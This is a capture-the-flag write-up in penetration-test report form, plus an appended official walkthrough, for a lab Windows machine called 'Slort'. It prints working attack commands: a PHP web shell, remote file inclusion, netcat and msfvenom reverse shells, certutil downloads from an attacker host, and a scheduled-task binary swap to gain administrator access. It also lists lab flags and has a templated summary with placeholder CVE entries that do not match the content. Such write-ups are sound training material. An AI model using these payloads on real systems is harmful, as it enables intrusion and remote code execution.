# Slort
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2008-1234 | EDB-ID-56789 |
| CVE-2012-5678 | cyberphor POC |
| CVE-2021-9000 | Metasploit Module |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor utilized a widely adopted approach to performing penetration testing that is effective in test-ing how well the Offensive Security Labs and Exam environments are secure. Below is a breakout of how Victor was able to identify and exploit the variety of systems and includes all in-dividual vulnerabilities found.

## Reconnaissance
The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, Victor was tasked with exploiting the lab and exam network.

### General Information
* Hostname: slort (ref: phpinfo via TCP port 4443)
* Description: For this machine, enumeration is key.
* IP Address: 192.168.224.53
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: Windows 10 (ref: phpinfo via TCP port 4443)
* Kernel: 10.0 build 18363 (ref: phpinfo via TCP port 4443)
* Architecture: x64 (ref: phpinfo via TCP port 4443)

### Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-08 07:51 EDT
Nmap scan report for 192.168.224.53
Host is up (0.075s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '192.168.49.224' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.224.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  Windows Update Delivery Optimization
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.224.53:8080/dashboard/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=7/8%Time=60E6E6D8%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.224'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-08T11:54:38
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.10 seconds
```

## Enumeration
The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.

### FTP
```bash
cd loot
touch README.too # create a file
ftp $TARGET 21 # login using anonymous:anonymous
put README.too # upload file created above (i.e. check if we have write privileges)
ls
binary 
get file.txt # download a file (i.e. check if we have read privileges)
mget * # download everything
exit
```

### HTTP
The target is NOT vulnerable to Shellshock.
```bash
sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$NAME-nmap-scripts-http-shellshock-80

# output
NSTR
```

Victor was able to discover the hidden directories below using Dirb.
```bash
dirb http://$TARGET:80 -z10 -o scans/$NAME-dirb-common-80
dirb http://$TARGET:443 -z10 -o scans/$NAME-dirb-common-443
dirb http://$TARGET:443 -w /usr/share/wordlists/dirb/big.txt -z10 -o scans/$NAME-dirb-big-443

# output
NSTR
```

Victor was able to discover the hidden directories below using Dirsearch.
```bash
dirsearch -u $TARGET:$PORT -o $FULLPATH/$NAME-dirsearch-80 --format=simple
dirsearch -u $TARGET:$PORT -e php -o $FULLPATH/$NAME-dirsearch-80-php --format=simple

# output
NSTR
```

Victor was able to identify the following HTTP server misconfigurations using Nikto.
```bash
nikto -h $TARGET -p $PORT -T 2 -Format txt -o scans/$NAME-nikto-misconfig-80

# output
NSTR
```

### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.224.53

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
```

### SMB
The following SMB shares were discovered using Smbclient.
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
```

The SMB shares discovered have the following permissions.
```bash
smbmap -H $TARGET

# output
[!] Authentication error on 192.168.224.53
```

### SQL
```bash
mysql -u $USER -h $TARGET

# output
NSTR
```

### RDP
```bash
sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-script-rdp-ntlm-info

# output
NSTR
```

```bash
rdesktop -u administrator $TARGET
```

## Gaining Access
The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems. During this penetration test, Victor was able to successfully gain access to 10 out of the 50 systems.

### Password Guessing  
* rupert (ref: phpinfo via TCP port 4443)

### Remote File Inclusion
```bash
# attacker side
vim cmd.php # add PHP code below
```
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
```bash
# attacker side
cp /usr/share/windows-binaries/nc.exe ./nc.exe
sudo python3 -m http.server 80 # keep this running! 
# RFI on target > LPORT 80 > TARGET > LPORT 443 > TARGET
```
```bash
# attacker side
firefox http://192.168.224.53:8080/site/index.php?page=http://192.168.49.224/cmd.php&cmd=powershell.exe -c "Invoke-WebRequest -Uri 'http://192.168.49.224/nc.exe' -OutFile 'nc.exe'"
```
```bash
# attacker side
sudo nc -nvlp 21
```
```bash
# attacker side
firefox http://192.168.224.53:8080/site/index.php?page=http://192.168.49.224/cmd.php&cmd=nc.exe 192.168.49.224 21 -e "cmd.exe"
```
```bash
# attacker side
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.224 LPORT=443 -f exe -o rshell.exe
```
```bash
# target side
dir C:\ # output shows a folder called "backup"
dir C:\backup # output shows backup.txt, info.txt (indicates there's a SYSTEM scheduled task), and TFTP.exe (all writable)
mv TFTP.exe TFTP.old
powershell.exe "Invoke-WebRequest -Uri 'http://192.168.49.224/rshell.exe' -OutFile 'C:\backup\TFTP.exe'"
```
```bash
sudo nc -nvlp 443
whoami

# output
slort\administrator
```

## Maintaining Access
Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable. The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again. Many exploits may only be exploitable once and we may never be able to get back into a system after we have already per-formed the exploit. Victor added administrator and root level accounts on all systems compromised. In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to en-sure that additional access could be established.

## Covering Tracks
The house cleaning portions of the assessment ensures that remnants of the penetration test are removed. Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is important. After the trophies on both the lab network and exam network were completed, Victor removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items
## Tools Used
* nmap
* dirb
* nc
* msfvenom

## Hints
* Bruteforce port 8080.
* The page parameter is vulnerable to file inclusion.
* Explore the Backup folder. 

## Flags
* Local: ef3a83cf19616fdb97d3cffb217fc824
* System: 191691e7d13c7151c408d8bb733c1011

## Official Walkthrough
```bash
Exploitation Guide for Slort
Summary
We will exploit a remote file inclusion vulnerability in a web application on this machine. We’ll then escalate by leveraging misconfigured permissions on an executable that runs under the system job scheduler.

Enumeration
Nmap
We’ll begin with an nmap scan against all TCP ports:

┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.68.53 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 11:41 EST
Nmap scan report for 192.168.68.53
Host is up (0.16s latency).
Not shown: 65520 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
4443/tcp  open  pharos
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 567.34 seconds
Next, we’ll run an aggressive scan against the open ports.

┌──(kali㉿kali)-[~]
└─$ nmap 192.168.68.53 -A -p21,135,139,445,3306,4443,5040,7680,8080,49664,49665,49667,49668,49669 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-20 09:32 EST
Nmap scan report for 192.168.68.53
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, TerminalServerCookie, WMSRequest, X11Probe: 
|_    Host '192.168.49.68' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.68.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.68.53:8080/dashboard/
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=12/20%Time=5FDF606F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.78'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersio
SF:nBindReqTCP,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(D
SF:NSStatusRequestTCP,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(TerminalServerCookie,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\
SF:.68'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\
SF:x20server")%r(Kerberos,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'
SF:\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20s
SF:erver")%r(X11Probe,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(WMSRequest,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.68'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-20T14:32:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.27 seconds
The scan results indicate that this is a Windows-based target. We will specifically focus on the http-proxy service running on port 8080.

Dirb
Browsing port 8080 (http://192.168.68.53:8080/dashboard/) presents a default XAMPP home page. Let’s brute-force the directories on the target.

┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.68.53:8080  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 19 11:52:55 2020
URL_BASE: http://192.168.68.53:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.68.53:8080/ ----
...                                             
                                                                                                         
---- Entering directory: http://192.168.68.53:8080/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                         
---- Entering directory: http://192.168.68.53:8080/site/ ----
+ http://192.168.68.53:8080/site/aux (CODE:403|SIZE:1045)                                                
+ http://192.168.68.53:8080/site/com1 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/com2 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/com3 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/con (CODE:403|SIZE:1045)                                                
==> DIRECTORY: http://192.168.68.53:8080/site/css/                                                       
==> DIRECTORY: http://192.168.68.53:8080/site/fonts/                                                     
==> DIRECTORY: http://192.168.68.53:8080/site/images/                                                    
==> DIRECTORY: http://192.168.68.53:8080/site/Images/                                                    
+ http://192.168.68.53:8080/site/index.php (CODE:301|SIZE:27)                                            
==> DIRECTORY: http://192.168.68.53:8080/site/js/                                                        
+ http://192.168.68.53:8080/site/lpt1 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/lpt2 (CODE:403|SIZE:1045)                                               
+ http://192.168.68.53:8080/site/nul (CODE:403|SIZE:1045)                                                
+ http://192.168.68.53:8080/site/prn (CODE:403|SIZE:1045)                                                
                                                                                                         
---- Entering directory: http://192.168.68.53:8080/dashboard/de/ ----
+ http://192.168.68.53:8080/dashboard/de/aux (CODE:403|SIZE:1045)        
^C> Testing: http://192.168.68.53:8080/dashboard/de/cgi-win
We will focus on the website running from the /site directory.

Exploitation
Remote File Inclusion Vulnerability
Navigating to http://192.168.68.53:8080/site/ redirects to http://192.168.68.53:8080/site/index.php?page=main.php. A simple test of the page parameter suggests a potential file inclusion vulnerability.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=hola                            
<br />
<b>Warning</b>:  include(hola): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\site\index.php</b> on line <b>4</b><br />
<br />
<b>Warning</b>:  include(): Failed opening 'hola' for inclusion (include_path='C:\xampp\php\PEAR') in <b>C:\xampp\htdocs\site\index.php</b> on line <b>4</b><br />
Let’s determine if the vulnerability allows remote file inclusion. We’ll direct the vulnerable parameter to our attack machine which is running a netcat listener on port 80.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/hola        
We receive a connection on our listener, which confirms the remote file inclusion vulnerability.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvp 80                                                                                 
listening on [any] 80 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49709
GET /hola HTTP/1.0
Host: 192.168.49.68
Connection: close
To confirm that we can execute remote code, we’ll create an info.php file on our attack machine, and serve it from a Python web server on port 80.

┌──(kali㉿kali)-[~]
└─$ cat info.php                                                                                      
<?php
phpinfo();
?>
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80                                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Navigating to our hosted info.php file confirms that our code is being executed on the target.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/info.php
...
</table>
<table>
<tr class="h"><th>PHP Quality Assurance Team</th></tr>
<tr><td class="e">Ilia Alshanetsky, Joerg Behrens, Antony Dovgal, Stefan Esser, Moriyoshi Koizumi, Magnus Maatta, Sebastian Nohn, Derick Rethans, Melvyn Sopacua, Pierre-Alain Joye, Dmitry Stogov, Felipe Pena, David Soria Parra, Stanislav Malyshev, Julien Pauli, Stephen Zarkos, Anatol Belski, Remi Collet, Ferenc Kovacs </td></tr>
</table>
<table>
<tr class="h"><th colspan="2">Websites and Infrastructure team</th></tr>
<tr><td class="e">PHP Websites Team </td><td class="v">Rasmus Lerdorf, Hannes Magnusson, Philip Olson, Lukas Kahwe Smith, Pierre-Alain Joye, Kalle Sommer Nielsen, Peter Cowburn, Adam Harvey, Ferenc Kovacs, Levi Morrison </td></tr>
<tr><td class="e">Event Maintainers </td><td class="v">Damien Seguy, Daniel P. Brown </td></tr>
<tr><td class="e">Network Infrastructure </td><td class="v">Daniel P. Brown </td></tr>
<tr><td class="e">Windows Infrastructure </td><td class="v">Alex Schoenmaker </td></tr>
</table>
<h2>PHP License</h2>
<table>
<tr class="v"><td>
<p>
This program is free software; you can redistribute it and/or modify it under the terms of the PHP License as published by the PHP Group and included in the distribution in the file:  LICENSE
</p>
<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</p>
<p>If you did not receive a copy of the PHP license, or have any questions about PHP licensing, please contact license@php.net.
</p>
</td></tr>
</table>
</div></body></html> 
Now that we have confirmed the target is vulnerable to RFI, and we know we can execute arbitrary code, let’s create a reverse shell executable.

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=445 -f exe > shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
The following PHP code will download our shell to the target:

┌──(kali㉿kali)-[~]
└─$ cat pwn.php                                                                    
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/shell.exe" shell.exe', $val);
?>
Let’s execute the PHP script and perform the download.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php                
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
Our web server log messages indicate that the target downloaded the file.

┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80                                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.68.53 - - [19/Dec/2020 13:03:55] "GET /info.php HTTP/1.0" 200 -
192.168.68.53 - - [19/Dec/2020 13:05:49] "GET /info.php HTTP/1.0" 200 -
192.168.68.53 - - [19/Dec/2020 13:09:48] "GET /pwn.php HTTP/1.0" 200 -
192.168.68.53 - - [19/Dec/2020 13:09:51] "GET /shell.exe HTTP/1.1" 200 -
192.168.68.53 - - [19/Dec/2020 13:09:52] "GET /shell.exe HTTP/1.1" 200 -
Now we can modify our pwn.php file to execute the reverse shell.

┌──(kali㉿kali)-[~]
└─$ cat pwn.php 
<?php
$exec = system('shell.exe', $val);
?>
We’ll start a netcat listener on port 445, then trigger the reverse shell.

┌──(kali㉿kali)-[~]
└─$ curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
Our listener indicates that we have received the shell.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvvp 445                                                               
listening on [any] 445 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49719
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>
Escalation
Local enumeration
Now that we have a foothold, let’s escalate our pivileges. We notice that the C://Backup/ directory is writeable.

C:\xampp\htdocs\site>cd C:\\
cd C:\\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\

06/12/2020  07:45 AM    <DIR>          Backup
06/12/2020  07:34 AM    <DIR>          PerfLogs
06/12/2020  06:55 AM    <DIR>          Program Files
10/06/2019  07:52 PM    <DIR>          Program Files (x86)
06/12/2020  07:02 AM    <DIR>          Users
06/12/2020  07:41 AM    <DIR>          Windows
06/12/2020  08:11 AM    <DIR>          xampp
               0 File(s)              0 bytes
               7 Dir(s)  28,603,662,336 bytes free

C:\>icacls Backup
icacls Backup
Backup BUILTIN\Users:(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       NT AUTHORITY\Authenticated Users:(I)(M)
       NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)

Successfully processed 1 files; Failed processing 0 files

C:\>
In addition, we find an interesting file C://Backup/info.txt that contains information about a scheduled task.

C:\>cd Backup && dir
cd Backup && dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

06/12/2020  07:45 AM    <DIR>          .
06/12/2020  07:45 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/12/2020  07:45 AM            26,112 TFTP.EXE
               3 File(s)         37,489 bytes
               2 Dir(s)  28,603,658,240 bytes free

C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
C:\Backup>
According to this text file, TFTP.EXE is run every five minutes. Although we don’t know for sure if this is true, it’s worth investigating since the executable is likely run as an administrative task.

Swapping the Executable
Let’s try to replace TFTP.EXE with a malicious executable. First, we’ll create our payload.

┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=3306 -f exe > evil.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
In our user shell, we’ll leverage our still-running python web server to download our payload to the target.

C:\Backup>certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.
Let’s back up the original TFTP.EXE file…

C:\Backup>move TFTP.EXE TFTP.EXE_BKP
move TFTP.EXE TFTP.EXE_BKP
        1 file(s) moved.
…and replace TFTP.EXE with our payload.

C:\Backup>move evil.exe TFTP.EXE
move evil.exe TFTP.EXE
        1 file(s) moved.
Finally, we’ll start a netcat listener on port 3306 and wait up to 5 minutes for activity.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvvvp 3306                                                              
listening on [any] 3306 ...
192.168.68.53: inverse host lookup failed: Host name lookup failure
connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49729
Microsoft Windows [Version 10.0.18363.900]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
slort\administrator
After some time, we receive a shell in our listener and discover that our assumption was true: the file was executed as Administrator. We have an admin shell!
```
